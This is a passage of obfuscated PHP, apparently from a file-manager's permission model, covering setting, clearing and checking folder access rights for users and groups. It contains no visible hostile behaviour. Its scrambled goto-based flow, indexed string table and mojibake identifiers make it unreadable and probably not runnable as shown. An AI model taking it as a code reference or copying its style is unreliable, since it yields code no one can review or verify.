$cèÙë®‘½¹[$B„À³Ì—Œ‹] = $A–”‰×«¶•[$B„À³Ì—Œ‹] ? $A–”‰×«¶•[$B„À³Ì—Œ‹] : array(); } goto EƒÃ’ãª©Œ; cîÃÀì›îÏ: if (count($Bö³Á¢Ë†¦) == count($D•éáÛ©)) { return $däÃˆ„”ÍÛ ? $Bö³Á¢Ë†¦[$D•éáÛ©[0]] : $Bö³Á¢Ë†¦; } $cÙ„èáí = $cİñ…”ä±Ë[1858]; $aº–ùµ–Ò = array($cİñ…”ä±Ë[403] => array($cİñ…”ä±Ë[17], $D•éáÛ©)); goto bôÁ¦Úîá‡; d¯ÄóÑÊ¡±: } public function setAuth($d µ¢‡ˆ±, $aò µ¤‹) { goto B³šÎˆ›Ç®; E‡¦ÇÇ¸Ç: if ($F„×æéå¦[$Aê¤Š›Šîº[412]] != SourceModel::TYPE_GROUP) { return !1; } $b¼‡ÂÎÑ–¦ = 1; $CÙîÂÈ˜š” = $F„×æéå¦[$Aê¤Š›Šîº[492]]; goto FÓÕˆˆ‰İš; B³šÎˆ›Ç®: $Aê¤Š›Šîº =& $_SERVER[£¶ä½¶¢]; $F„×æéå¦ = Model($Aê¤Š›Šîº[1203])->sourceInfo($d µ¢‡ˆ±); if (!$F„×æéå¦) { return !1; } goto E‡¦ÇÇ¸Ç; FÓÕˆˆ‰İš: if ($CÙîÂÈ˜š” != $b¼‡ÂÎÑ–¦) { $FÔ”àÚ×ß = array($Aê¤Š›Šîº[1690] => $CÙîÂÈ˜š”); $e’ì»õª– = Model($Aê¤Š›Šîº[1771])->field($Aê¤Š›Šîº[1526])->where($FÔ”àÚ×ß)->select(); $e’ì»õª– = array_to_keyvalue($e’ì»õª–, $Aê¤Š›Šîº[43], $Aê¤Š›Šîº[1526]); } $A‘‰¯•èÆ¥ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $EÚóÕëßö‡ = array(); goto eìÕ¾Ì·‡; eìÕ¾Ì·‡: foreach ($aò µ¤‹ as $aâ”Ê­öÈƒ) { if (!in_array($aâ”Ê­öÈƒ[$Aê¤Š›Šîº[412]], $A‘‰¯•èÆ¥)) { show_json(LNG($Aê¤Š›Šîº[1859]), !1); } if ($CÙîÂÈ˜š” != $b¼‡ÂÎÑ–¦) { if ($aâ”Ê­öÈƒ[$Aê¤Š›Šîº[412]] == SourceModel::TYPE_GROUP) { } if ($aâ”Ê­öÈƒ[$Aê¤Š›Šîº[492]] != 0 && !in_array($aâ”Ê­öÈƒ[$Aê¤Š›Šîº[492]], $e’ì»õª–)) { } } if ($aâ”Ê­öÈƒ[$Aê¤Š›Šîº[492]] == 0) { $aâ”Ê­öÈƒ[$Aê¤Š›Šîº[412]] = SourceModel::TYPE_USER; } $EÚóÕëßö‡[] = array($Aê¤Š›Šîº[403] => $d µ¢‡ˆ±, $Aê¤Š›Šîº[412] => intval($aâ”Ê­öÈƒ[$Aê¤Š›Šîº[412]]), $Aê¤Š›Šîº[492] => intval($aâ”Ê­öÈƒ[$Aê¤Š›Šîº[492]]), $Aê¤Š›Šîº[1785] => intval($aâ”Ê­öÈƒ[$Aê¤Š›Šîº[1785]]) ? intval($aâ”Ê­öÈƒ[$Aê¤Š›Šîº[1785]]) : 0, $Aê¤Š›Šîº[1839] => intval($aâ”Ê­öÈƒ[$Aê¤Š›Šîº[1839]]) ? intval($aâ”Ê­öÈƒ[$Aê¤Š›Šîº[1839]]) : -1); } $this->where(array($Aê¤Š›Šîº[418] => $d µ¢‡ˆ±))->delete(); $this->addAll($EÚóÕëßö‡); goto a÷ßÈìùª; a÷ßÈìùª: return !0; goto AÕ© ƒô·°; AÕ© ƒô·°: } public function authClear($e±ÈŒ×Û´) { $dÀ³¦¢µ‹î =& $_SERVER[£¶ä½¶¢]; $Fã‹µ†“°µ = Model($dÀ³¦¢µ‹î[1203])->sourceInfo($e±ÈŒ×Û´); $DóÕ„Û‰Ğ = array($e±ÈŒ×Û´); if ($Fã‹µ†“°µ[$dÀ³¦¢µ‹î[411]] == $dÀ³¦¢µ‹î[97]) { $c¢Ö«ƒõ¤ = array($dÀ³¦¢µ‹î[561] => array($dÀ³¦¢µ‹î[520], $Fã‹µ†“°µ[$dÀ³¦¢µ‹î[495]] . $e±ÈŒ×Û´ . $dÀ³¦¢µ‹î[521])); $DóÕ„Û‰Ğ = Model($dÀ³¦¢µ‹î[1203])->field($dÀ³¦¢µ‹î[418])->where($c¢Ö«ƒõ¤)->getField($dÀ³¦¢µ‹î[403], !0); $DóÕ„Û‰Ğ[] = $e±ÈŒ×Û´; } $this->where(array($dÀ³¦¢µ‹î[418] => array($dÀ³¦¢µ‹î[419], $DóÕ„Û‰Ğ)))->delete(); return !0; } public function getAllChildren($FİĞ¼¶ìß¡) { goto FÇÉ’À¹‘’; cİºÔ²­: if ($aã‡ªÊÕóì[$B’«´‡£ŠŸ[486]] == $B’«´‡£ŠŸ[201] && $aã‡ªÊÕóì[$B’«´‡£ŠŸ[492]] != $f§‚µ–„æË) { $C‰¦ï·†·Ÿ = $this->groupChidldAllRootSource($aã‡ªÊÕóì[$B’«´‡£ŠŸ[492]]); } $FòÔ¼¿‡Êö = $this->field($B’«´‡£ŠŸ[403])->group($B’«´‡£ŠŸ[403])->select(); $FòÔ¼¿‡Êö = array_to_keyvalue($FòÔ¼¿‡Êö, $B’«´‡£ŠŸ[43], $B’«´‡£ŠŸ[403]); goto FÜëƒÂš§†; FÇÉ’À¹‘’: $B’«´‡£ŠŸ =& $_SERVER[£¶ä½¶¢]; $aã‡ªÊÕóì = Model($B’«´‡£ŠŸ[1203])->sourceInfo($FİĞ¼¶ìß¡); if ($aã‡ªÊÕóì[$B’«´‡£ŠŸ[411]] != $B’«´‡£ŠŸ[97]) { return $this->sourceListAuth(array($FİĞ¼¶ìß¡)); } goto E‰ŞÎ®Ü£; FÜëƒÂš§†: if (!$FòÔ¼¿‡Êö) { return array(); } $dÖ™èªÃõ§ = $B’«´‡£ŠŸ[1860]; $eã¾É¾åÖ¿ = array($B’«´‡£ŠŸ[403] => array($B’«´‡£ŠŸ[17], $FòÔ¼¿‡Êö), $B’«´‡£ŠŸ[431] => $B’«´‡£ŠŸ[201]); goto aõŒôÒÇ–; E‰ŞÎ®Ü£: if ($aã‡ªÊÕóì[$B’«´‡£ŠŸ[412]] != SourceModel::TYPE_GROUP) { return array(); } $f§‚µ–„æË = 1; $C‰¦ï·†·Ÿ = array($FİĞ¼¶ìß¡); goto cİºÔ²­; aõŒôÒÇ–: $EÛ‹†„á¡Ğ = Model($B’«´‡£ŠŸ[798])->field($dÖ™èªÃõ§)->where($eã¾É¾åÖ¿)->select(); $BÈŠ±İ˜„Ã = array($FİĞ¼¶ìß¡); foreach ($EÛ‹†„á¡Ğ as $E®óÙÌß×ë) { foreach ($C‰¦ï·†·Ÿ as $fòˆÇóÔ¡¤) { $CñÇï¸Ã“å = $B’«´‡£ŠŸ[57] . $fòˆÇóÔ¡¤ . $B’«´‡£ŠŸ[57]; $EáËÕ¬Š° = $E®óÙÌß×ë[$B’«´‡£ŠŸ[495]] . $E®óÙÌß×ë[$B’«´‡£ŠŸ[403]] . $B’«´‡£ŠŸ[57]; if (strstr($EáËÕ¬Š°, $CñÇï¸Ã“å)) { $BÈŠ±İ˜„Ã[] = $E®óÙÌß×ë[$B’«´‡£ŠŸ[403]]; break; } } } goto EÓˆßÜö¯æ; EÓˆßÜö¯æ: return $this->sourceListAuth($BÈŠ±İ˜„Ã); goto AêËºËšãŠ; AêËºËšãŠ: } private function sourceListAuth($dÔŸõè½„‹) { goto fó£åáš°; DÛÚ§­Ò‘µ: array_multisort($Dğ‡Ñ÷È²Ø, SORT_ASC, $dŒÙ§¡åœä); return $dŒÙ§¡åœä; goto AÜ¨¤«ÔÈï; fó£åáš°: $Cì©ªæÃ =& $_SERVER[£¶ä½¶¢]; $e—õ°¡ÇåÜ = Model($Cì©ªæÃ[1203])->sourceListInfo($dÔŸõè½„‹, !0); $f„Ãì„ºÏ = $this->sourceAuthSelect($dÔŸõè½„‹); goto A£·Î‹¬; A£·Î‹¬: $dŒÙ§¡åœä = array(); $Dğ‡Ñ÷È²Ø = array(); foreach ($e—õ°¡ÇåÜ as $bŒ–Œñ¯î) { goto B»¥îÜëİ; B¾…óŸì½‡: $bŒ–Œñ¯î[$Cì©ªæÃ[1861]] = $this->authTargetInfo($bËÚâÀŒÆë); $bŒ–Œñ¯î[$Cì©ªæÃ[503]] = rtrim($bŒ–Œñ¯î[$Cì©ªæÃ[498]], $Cì©ªæÃ[18]) . $Cì©ªæÃ[18] . ltrim($bŒ–Œñ¯î[$Cì©ªæÃ[503]], $Cì©ªæÃ[18]); $dŒÙ§¡åœä[] = $bŒ–Œñ¯î; goto EÎÉ‘­äÈÍ; F …ß‡Í†Ú: unset($bŒ–Œñ¯î[$Cì©ªæÃ[95]]); $bËÚâÀŒÆë = $f„Ãì„ºÏ[$bŒ–Œñ¯î[$Cì©ªæÃ[403]]]; if (!$bËÚâÀŒÆë) { continue; } goto B¾…óŸì½‡; EÎÉ‘­äÈÍ: $fÎ½ØÅ÷Ó• = count(explode($Cì©ªæÃ[18], trim($bŒ–Œñ¯î[$Cì©ªæÃ[503]], $Cì©ªæÃ[18]))); $Dğ‡Ñ÷È²Ø[] = $fÎ½ØÅ÷Ó• + ($bŒ–Œñ¯î[$Cì©ªæÃ[39]] == $Cì©ªæÃ[87] ? 0 : 1000); goto bÉö·Ş¡Œå; B»¥îÜëİ: unset($bŒ–Œñ¯î[$Cì©ªæÃ[442]]); unset($bŒ–Œñ¯î[$Cì©ªæÃ[440]]); unset($bŒ–Œñ¯î[$Cì©ªæÃ[414]]); goto F …ß‡Í†Ú; bÉö·Ş¡Œå: } goto DÛÚ§­Ò‘µ; AÜ¨¤«ÔÈï: } private function groupChidldAllRootSource($e ‡‘Ÿ½Ş) { $bÖ²Ï„–Ç =& $_SERVER[£¶ä½¶¢]; $C¤Àø‡Û = Model($bÖ²Ï„–Ç[1862])->groupChildrenAll($e ‡‘Ÿ½Ş); $e ’×‚Àõğ = array($bÖ²Ï„–Ç[486] => 0, $bÖ²Ï„–Ç[492] => array($bÖ²Ï„–Ç[17], $C¤Àø‡Û), $bÖ²Ï„–Ç[412] => SourceModel::TYPE_GROUP); $aË»ªğæë = Model($bÖ²Ï„–Ç[798])->field($bÖ²Ï„–Ç[403])->where($e ’×‚Àõğ)->select(); $aË»ªğæë = array_to_keyvalue($aË»ªğæë, $bÖ²Ï„–Ç[43], $bÖ²Ï„–Ç[403]); return $aË»ªğæë; } private function authTargetInfo($EÙ´çå¿·©) { goto eâ½á²¨í‰; d©éğèôŠÌ: return $dÀØ¹Õ©ß; goto a†™Îˆ×ˆ§; d—š¾ÃĞ: $CˆÀ“¢Øùè = 2 << 25; foreach ($EÙ´çå¿·© as $F‡ĞÌªÕŞÛ) { goto d›¦ˆÊøÔ; e¬®íÕìù : $b—Ã†‡ÕÄÖ = 0; if ($F‡ĞÌªÕŞÛ[$EÈîÇöˆŠš[412]] == SourceModel::TYPE_GROUP) { $b—Ã†‡ÕÄÖ = $CˆÀ“¢Øùè * 2; } if ($F‡ĞÌªÕŞÛ[$EÈîÇöˆŠš[412]] == SourceModel::TYPE_USER) { $b—Ã†‡ÕÄÖ = $CˆÀ“¢Øùè; } goto f¹±—¢ºÌÓ; f¹±—¢ºÌÓ: if ($F‡ĞÌªÕŞÛ[$EÈîÇöˆŠš[412]] == SourceModel::TYPE_USER && $F‡ĞÌªÕŞÛ[$EÈîÇöˆŠš[492]] == $EÈîÇöˆŠš[201]) { $b—Ã†‡ÕÄÖ = 0; } $e—›éİ—‹ö[] = $C‚¸ÇŒ†Í¶[$EÈîÇöˆŠš[414]] + $b—Ã†‡ÕÄÖ; goto aæ¹â¥¼©÷; d›¦ˆÊøÔ: $C‚¸ÇŒ†Í¶ = Model($EÈîÇöˆŠš[1857])->listData($F‡ĞÌªÕŞÛ[$EÈîÇöˆŠš[1785]]); if (!$C‚¸ÇŒ†Í¶) { continue; } if ($F‡ĞÌªÕŞÛ[$EÈîÇöˆŠš[412]] == SourceModel::TYPE_USER) { $fšÕöÌêÕ = Model($EÈîÇöˆŠš[510])->getInfoSimpleOuter($F‡ĞÌªÕŞÛ[$EÈîÇöˆŠš[492]]); if ($fšÕöÌêÕ[$EÈîÇöˆŠš[1526]] == $EÈîÇöˆŠš[1083]) { continue; } if ($fšÕöÌêÕ[$EÈîÇöˆŠš[1526]] == $EÈîÇöˆŠš[201]) { $fšÕöÌêÕ[$EÈîÇöˆŠš[38]] = LNG($EÈîÇöˆŠš[1863]); } } else { $fšÕöÌêÕ = Model($EÈîÇöˆŠš[494])->getInfoSimple($F‡ĞÌªÕŞÛ[$EÈîÇöˆŠš[492]]); } goto c¶ÎÈñ§é»; c¶ÎÈñ§é»: if (!$fšÕöÌêÕ) { continue; } $fšÕöÌêÕ[$EÈîÇöˆŠš[454]] = $C‚¸ÇŒ†Í¶; $dÀØ¹Õ©ß[] = $fšÕöÌêÕ; goto e¬®íÕìù ; aæ¹â¥¼©÷: } array_multisort($e—›éİ—‹ö, SORT_DESC, $dÀØ¹Õ©ß); goto d©éğèôŠÌ; eâ½á²¨í‰: $EÈîÇöˆŠš =& $_SERVER[£¶ä½¶¢]; $dÀØ¹Õ©ß = array(); $e—›éİ—‹ö = array(); goto d—š¾ÃĞ; a†™Îˆ×ˆ§: } public function getAllChildrenByUser($CœöÃóÖ, $DÅ¬ªÜÁÖ¥) { goto FÉÖ‚ïÙÛ“; DÙ®î¡ËÆ: if ($aàƒ‚Î¯¾ğ[$eäŒºƒÕ®Ğ[486]] == $eäŒºƒÕ®Ğ[201] && $aàƒ‚Î¯¾ğ[$eäŒºƒÕ®Ğ[492]] != $cñİ¦êòËÏ && $this->groupContainUser($aàƒ‚Î¯¾ğ[$eäŒºƒÕ®Ğ[492]], $DÅ¬ªÜÁÖ¥)) { foreach ($DÙêî÷«ØÎ[$eäŒºƒÕ®Ğ[1864]] as $D†ÌŠ„­äî) { $AÉ¨¨ö‹Ú˜ = Model($eäŒºƒÕ®Ğ[494])->getInfo($D†ÌŠ„­äî[$eäŒºƒÕ®Ğ[1690]]); $c¤ÖÃÓĞ«‚ = Model($eäŒºƒÕ®Ğ[514])->getInfoSimpleOuter($DÅ¬ªÜÁÖ¥); $c¤ÖÃÓĞ«‚[$eäŒºƒÕ®Ğ[454]] = $D†ÌŠ„­äî[$eäŒºƒÕ®Ğ[414]]; if (Model($eäŒºƒÕ®Ğ[1857])->authCheckAction($D†ÌŠ„­äî[$eäŒºƒÕ®Ğ[414]][$eäŒºƒÕ®Ğ[414]], $eäŒºƒÕ®Ğ[1710])) { continue; } $c›¡“«‹†Ü = array($eäŒºƒÕ®Ğ[38] => $eäŒºƒÕ®Ğ[1479] . $AÉ¨¨ö‹Ú˜[$eäŒºƒÕ®Ğ[38]], $eäŒºƒÕ®Ğ[403] => $AÉ¨¨ö‹Ú˜[$eäŒºƒÕ®Ğ[95]][$eäŒºƒÕ®Ğ[403]], $eäŒºƒÕ®Ğ[86] => KodIO::make($AÉ¨¨ö‹Ú˜[$eäŒºƒÕ®Ğ[95]][$eäŒºƒÕ®Ğ[403]]), $eäŒºƒÕ®Ğ[486] => $eäŒºƒÕ®Ğ[201], $eäŒºƒÕ®Ğ[412] => $eäŒºƒÕ®Ğ[1013], $eäŒºƒÕ®Ğ[39] => $eäŒºƒÕ®Ğ[525], $eäŒºƒÕ®Ğ[503] => $AÉ¨¨ö‹Ú˜[$eäŒºƒÕ®Ğ[499]], $eäŒºƒÕ®Ğ[1690] => $AÉ¨¨ö‹Ú˜[$eäŒºƒÕ®Ğ[1690]], $eäŒºƒÕ®Ğ[496] => $AÉ¨¨ö‹Ú˜[$eäŒºƒÕ®Ğ[486]], $eäŒºƒÕ®Ğ[1861] => array($c¤ÖÃÓĞ«‚)); $F±Ô¨Ş¢ [$c›¡“«‹†Ü[$eäŒºƒÕ®Ğ[403]]] = $c›¡“«‹†Ü; } } $bÎ«Õ›Û™Ø = array(); $E±ÍÊ‘­Èã = $this->getAllChildren($CœöÃóÖ); goto CÚÑ°äœ­®; CÚÑ°äœ­®: foreach ($E±ÍÊ‘­Èã as $EÓñø³­) { $cõ…„à”÷î = !1; foreach ($EÓñø³­[$eäŒºƒÕ®Ğ[1861]] as $e½é†„å×Ø) { if ($e½é†„å×Ø[$eäŒºƒÕ®Ğ[1526]]) { if ($e½é†„å×Ø[$eäŒºƒÕ®Ğ[1526]] == $DÅ¬ªÜÁÖ¥) { $cõ…„à”÷î = !0; break; } } if ($e½é†„å×Ø[$eäŒºƒÕ®Ğ[1690]]) { if ($this->groupContainUser($e½é†„å×Ø[$eäŒºƒÕ®Ğ[1690]], $DÅ¬ªÜÁÖ¥)) { $cõ…„à”÷î = !0; break; } } } if ($cõ…„à”÷î) { $bÎ«Õ›Û™Ø[] = $EÓñø³­; } $CÃ³÷¾´ = $EÓñø³­[$eäŒºƒÕ®Ğ[403]]; if (isset($F±Ô¨Ş¢ [$CÃ³÷¾´])) { $EÓñø³­[$eäŒºƒÕ®Ğ[1861]][] = $F±Ô¨Ş¢ [$CÃ³÷¾´][0]; $F±Ô¨Ş¢ [$CÃ³÷¾´] = !1; } } $F±Ô¨Ş¢  = array_filter(array_values($F±Ô¨Ş¢ )); $bÎ«Õ›Û™Ø = array_merge($F±Ô¨Ş¢ , $bÎ«Õ›Û™Ø); goto AŠÄš©¬; FÉÖ‚ïÙÛ“: $eäŒºƒÕ®Ğ =& $_SERVER[£¶ä½¶¢]; $DÙêî÷«ØÎ = Model($eäŒºƒÕ®Ğ[514])->getInfo($DÅ¬ªÜÁÖ¥); if (!$DÅ¬ªÜÁÖ¥ || !$CœöÃóÖ || !$DÙêî÷«ØÎ) { return array(); } goto bÄäµØëã; bÄäµØëã: $aàƒ‚Î¯¾ğ = Model($eäŒºƒÕ®Ğ[1203])->sourceInfo($CœöÃóÖ); $F±Ô¨Ş¢  = array(); $cñİ¦êòËÏ = 1; goto DÙ®î¡ËÆ; AŠÄš©¬: return $bÎ«Õ›Û™Ø; goto CŒµªîÔô; CŒµªîÔô: } public function setAllChildrenByUser($a„ùù´ã, $AÍáŒ‘¸°, $eã¿ƒÑøâÓ) { $dÀù®Îˆ‚¿ =& $_SERVER[£¶ä½¶¢]; $AÎÖçÔŠĞ‹ = $this->getAllChildrenByUser($a„ùù´ã, $AÍáŒ‘¸°); if (!$eã¿ƒÑøâÓ || !$AÎÖçÔŠĞ‹) { return !1; } foreach ($AÎÖçÔŠĞ‹ as $E†‡„Úé) { $A‡‘ÏÅöÜ• = array(); foreach ($E†‡„Úé[$dÀù®Îˆ‚¿[1861]] as $d—›×æíÏë) { $a¡ÈÉƒøò = $d—›×æíÏë[$dÀù®Îˆ‚¿[454]]; $AùŒßó÷æù = $d—›×æíÏë[$dÀù®Îˆ‚¿[1526]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $b‹Àßß£¶ = $d—›×æíÏë[$dÀù®Îˆ‚¿[1526]] ? $d—›×æíÏë[$dÀù®Îˆ‚¿[1526]] : $d—›×æíÏë[$dÀù®Îˆ‚¿[1690]]; if ($d—›×æíÏë[$dÀù®Îˆ‚¿[1526]] && $d—›×æíÏë[$dÀù®Îˆ‚¿[1526]] == $AÍáŒ‘¸°) { continue; } $A‡‘ÏÅöÜ•[] = array($dÀù®Îˆ‚¿[403] => $E†‡„Úé[$dÀù®Îˆ‚¿[403]], $dÀù®Îˆ‚¿[412] => $AùŒßó÷æù, $dÀù®Îˆ‚¿[492] => intval($b‹Àßß£¶), $dÀù®Îˆ‚¿[1785] => isset($a¡ÈÉƒøò[$dÀù®Îˆ‚¿[401]]) ? intval($a¡ÈÉƒøò[$dÀù®Îˆ‚¿[401]]) : 0, $dÀù®Îˆ‚¿[1839] => isset($a¡ÈÉƒøò[$dÀù®Îˆ‚¿[1839]]) ? intval($a¡ÈÉƒøò[$dÀù®Îˆ‚¿[1839]]) : -1); } $A‡‘ÏÅöÜ•[] = array($dÀù®Îˆ‚¿[403] => $E†‡„Úé[$dÀù®Îˆ‚¿[403]], $dÀù®Îˆ‚¿[412] => SourceModel::TYPE_USER, $dÀù®Îˆ‚¿[492] => intval($AÍáŒ‘¸°), $dÀù®Îˆ‚¿[1785] => intval($eã¿ƒÑøâÓ), $dÀù®Îˆ‚¿[1839] => -1); $this->where(array($dÀù®Îˆ‚¿[418] => $E†‡„Úé[$dÀù®Îˆ‚¿[403]]))->delete(); $this->addAll($A‡‘ÏÅöÜ•); } return !0; } public function get($F§˜Ù×ùÍ) { $cŒ¯ö†¨ò = $this->getSourceList(array($F§˜Ù×ùÍ), !0); return $cŒ¯ö†¨ò[0]; } public function getSourceList($e›¹·ƒğ, $E‹æ›Ğß¿¬ = false, $e‘¾ÈÍŞù = false) { goto cŠœÑ¬ÇØÑ; B¶¿¯È¾: if (!$E‹æ›Ğß¿¬ && count($e›¹·ƒğ) == 1) { $E‹æ›Ğß¿¬ = array(); $E‹æ›Ğß¿¬[$e›¹·ƒğ[0]] = $FäÒ‘Ò¾¹¶->sourceInfo($e›¹·ƒğ[0]); } if (!$E‹æ›Ğß¿¬) { $AÛ–šÆÈÜ¤ = array($EÖ¬³Ê¨íù[418] => array($EÖ¬³Ê¨íù[419], $e›¹·ƒğ)); $E‹æ›Ğß¿¬ = $FäÒ‘Ò¾¹¶->field($EÖ¬³Ê¨íù[1865])->where($AÛ–šÆÈÜ¤)->select(); $E‹æ›Ğß¿¬ = array_to_keyvalue($E‹æ›Ğß¿¬, $EÖ¬³Ê¨íù[403]); } $aÀ‹è™—½ = $e›¹·ƒğ; goto eÅ²İ¾”õª; eÅ²İ¾”õª: foreach ($E‹æ›Ğß¿¬ as $fÃÌª–—è· => $DôÀğ—î®‹) { $b°ù¥ğà• = $FäÒ‘Ò¾¹¶->parentLevelArray($DôÀğ—î®‹[$EÖ¬³Ê¨íù[495]]); $aÀ‹è™—½ = array_merge($aÀ‹è™—½, array($fÃÌª–—è·), array_reverse($b°ù¥ğà•)); } $aÀ‹è™—½ = array_values(array_unique($aÀ‹è™—½)); if (!$aÀ‹è™—½) { return array(); } goto aâãâ¹ë×; aâãâ¹ë×: $D £¶äª = $this->sourceAuthSelect($aÀ‹è™—½); $Cåß›Æè‘ = array(); foreach ($aÀ‹è™—½ as $FÅÙ°÷ÜÁÜ) { if (isset($D £¶äª[$FÅÙ°÷ÜÁÜ])) { $Cåß›Æè‘[$FÅÙ°÷ÜÁÜ] = $D £¶äª[$FÅÙ°÷ÜÁÜ]; } } goto B©Ô¾ƒ×ÇŸ; B©Ô¾ƒ×ÇŸ: $d…«ÔËµğ = $this->userIsRoot($e‘¾ÈÍŞù); $CòĞ…‡  Å = AuthModel::authAll(); $Cµ…¥„´Ö™ = array($EÖ¬³Ê¨íù[415] => $CòĞ…‡  Å, $EÖ¬³Ê¨íù[1866] => array($EÖ¬³Ê¨íù[420] => 0, $EÖ¬³Ê¨íù[1696] => $CòĞ…‡  Å, $EÖ¬³Ê¨íù[421] => LNG($EÖ¬³Ê¨íù[1867]), $EÖ¬³Ê¨íù[1711] => $EÖ¬³Ê¨íù[1868])); goto DìÊ“è‘Ğ™; DìÊ“è‘Ğ™: $cÒÊòÔè = array(); foreach ($E‹æ›Ğß¿¬ as $FÅÙ°÷ÜÁÜ => $d¯©ÍÜ«´Ã) { if ($d…«ÔËµğ) { $cÒÊòÔè[$FÅÙ°÷ÜÁÜ] = $Cµ…¥„´Ö™; continue; } $cÒÊòÔè[$FÅÙ°÷ÜÁÜ] = $this->makeSourceAuth($d¯©ÍÜ«´Ã, $Cåß›Æè‘, $e‘¾ÈÍŞù); } return $cÒÊòÔè; goto dÈÛóŠ½ĞÅ; cŠœÑ¬ÇØÑ: $EÖ¬³Ê¨íù =& $_SERVER[£¶ä½¶¢]; if (!$e›¹·ƒğ) { return array(); } $FäÒ‘Ò¾¹¶ = Model($EÖ¬³Ê¨íù[1203]); goto B¶¿¯È¾; dÈÛóŠ½ĞÅ: } public function authDeepCheck($bÏˆæİ¶ÛĞ, $DŸó¬Û¡ìÂ = false) { goto E‰¡éà†Ì…; E‰¡éà†Ì…: $c²â•ëÛš =& $_SERVER[£¶ä½¶¢]; $DŸó¬Û¡ìÂ = $DŸó¬Û¡ìÂ ? $DŸó¬Û¡ìÂ : USER_ID; $E£ã–¯ö· = $this->makeAuthDeep($DŸó¬Û¡ìÂ); goto a×²”ø¼¼; a×²”ø¼¼: if (!in_array($bÏˆæİ¶ÛĞ, $E£ã–¯ö·[$c²â•ëÛš[1869]])) { return !1; } $c‹Ä„ÚÊŒÉ = array(); foreach ($E£ã–¯ö·[$c²â•ëÛš[1870]] as $cññÂ¨•ˆ  => $B ââ—ö¤) { if (!in_array($bÏˆæİ¶ÛĞ, $B ââ—ö¤)) { continue; } $c‹Ä„ÚÊŒÉ[] = $cññÂ¨•ˆ ; } goto f˜ãËôæÑÖ; f˜ãËôæÑÖ: if (!$c‹Ä„ÚÊŒÉ) { return !1; } $C£âÂ›†ÖÜ = $c‹Ä„ÚÊŒÉ ? $c‹Ä„ÚÊŒÉ[0] : $bÏˆæİ¶ÛĞ; return array($c²â•ëÛš[415] => -1, $c²â•ëÛš[454] => array($c²â•ëÛš[420] => $c²â•ëÛš[1083], $c²â•ëÛš[1696] => $c²â•ëÛš[201], $c²â•ëÛš[421] => LNG($c²â•ëÛš[1871]), $c²â•ëÛš[1711] => $c²â•ëÛš[1872]), $c²â•ëÛš[1873] => LNG($c²â•ëÛš[1874]), $c²â•ëÛš[1875] => $this->sourceAuthInfo($C£âÂ›†ÖÜ)); goto d÷¥ñ°ŠŒ¹; d÷¥ñ°ŠŒ¹: } protected function makeAuthDeep($AŒõºÍ¤è² = false) { goto Bë¥ ïÙ›±; e…Á˜ößÚÓ: $C’¶‚¿«Ä = array(); $D£“øÙœŸ = array(); $BĞ›Ø—ñš = array(); goto Dã¢èá¿Ø; bÃá‹ ç½: $b†ñĞ„îéÔ = array_to_keyvalue_group($A’´Ã®×Ê, $A£æ™İéíõ[403]); foreach ($b†ñĞ„îéÔ as $e‡ØÔæĞÚÌ => $Dµã¾Ğä±Ê) { $A¦×Â˜ºë = $this->authArrayCheck($Dµã¾Ğä±Ê, $AŒõºÍ¤è²); if ($A¦×Â˜ºë[$A£æ™İéíõ[415]] > 0) { $aŠÚ–ºÌ‚µ[] = $e‡ØÔæĞÚÌ . $A£æ™İéíõ[43]; } } $Aìñ³Œˆğ = array(); goto aƒå…¹Í¸; AµÁ®ì³: foreach ($E‹îŠŠ«×Ô as $cÛµÈçŸ”Ñ) { if ($cÛµÈçŸ”Ñ[$A£æ™İéíõ[414]] == 0 && $cÛµÈçŸ”Ñ[$A£æ™İéíõ[1712]] == $A£æ™İéíõ[97]) { $B¯È†ªâù¼[] = $cÛµÈçŸ”Ñ[$A£æ™İéíõ[401]]; } } $CÈĞÜÙóğ„ = $this->userGroupParents($AŒõºÍ¤è²); $eâÕ’ƒ»†Ú = array($A£æ™İéíõ[412] => SourceModel::TYPE_USER, $A£æ™İéíõ[492] => $AŒõºÍ¤è²); goto eİÏ™„œÆ¢; aƒå…¹Í¸: $EçÚ•¤¢Êİ = $CÈĞÜÙóğ„; $B “ï‰Ûâ‡ = Model($A£æ™İéíõ[1203]); $a¾àİËÁÃÉ = Model($A£æ™İéíõ[494]); goto e…Á˜ößÚÓ; eİÏ™„œÆ¢: if ($CÈĞÜÙóğ„) { $eâÕ’ƒ»†Ú = array(array($A£æ™İéíõ[412] => SourceModel::TYPE_USER, $A£æ™İéíõ[492] => $AŒõºÍ¤è²), array($A£æ™İéíõ[412] => SourceModel::TYPE_GROUP, $A£æ™İéíõ[492] => array($A£æ™İéíõ[419], $CÈĞÜÙóğ„)), $A£æ™İéíõ[955] => $A£æ™İéíõ[1777]); } $A’´Ã®×Ê = $this->field($A£æ™İéíõ[1877])->where($eâÕ’ƒ»†Ú)->select(); $aŠÚ–ºÌ‚µ = array(); goto bÃá‹ ç½; f°¦“Îø: if (isset($E…®œÂ¢¬‰[$AŒõºÍ¤è²])) { return $E…®œÂ¢¬‰[$AŒõºÍ¤è²]; } $E‹îŠŠ«×Ô = Model($A£æ™İéíõ[1876])->listData(); $B¯È†ªâù¼ = array(); goto AµÁ®ì³; Dã¢èá¿Ø: $eà‘­Ø ¹ = array(); if ($aŠÚ–ºÌ‚µ) { $eİÈø¾¡© = $B “ï‰Ûâ‡->where(array($A£æ™İéíõ[403] => array($A£æ™İéíõ[419], $aŠÚ–ºÌ‚µ)))->select(); foreach ($eİÈø¾¡© as $d®íÜù›ºÀ) { $B†·º§£–Û = $B “ï‰Ûâ‡->parentLevelArray($d®íÜù›ºÀ[$A£æ™İéíõ[495]]); $Aìñ³Œˆğ = array_merge($Aìñ³Œˆğ, $B†·º§£–Û); $EçÚ•¤¢Êİ[] = $d®íÜù›ºÀ[$A£æ™İéíõ[492]]; $C’¶‚¿«Ä[$d®íÜù›ºÀ[$A£æ™İéíõ[403]]] = $B†·º§£–Û; $D£“øÙœŸ[$d®íÜù›ºÀ[$A£æ™İéíõ[403]]] = $d®íÜù›ºÀ[$A£æ™İéíõ[492]]; } } $EçÚ•¤¢Êİ = array_values(array_unique($EçÚ•¤¢Êİ)); goto AÀŞŸ„³À¶; c»¯‚„­: $F¦æĞ©Ñîá = array($A£æ™İéíõ[1869] => $Aìñ³Œˆğ, $A£æ™İéíõ[1870] => $C’¶‚¿«Ä); $E…®œÂ¢¬‰[$AŒõºÍ¤è²] = $F¦æĞ©Ñîá; return $F¦æĞ©Ñîá; goto AÃÙ‰ù®ŒÛ; Bë¥ ïÙ›±: 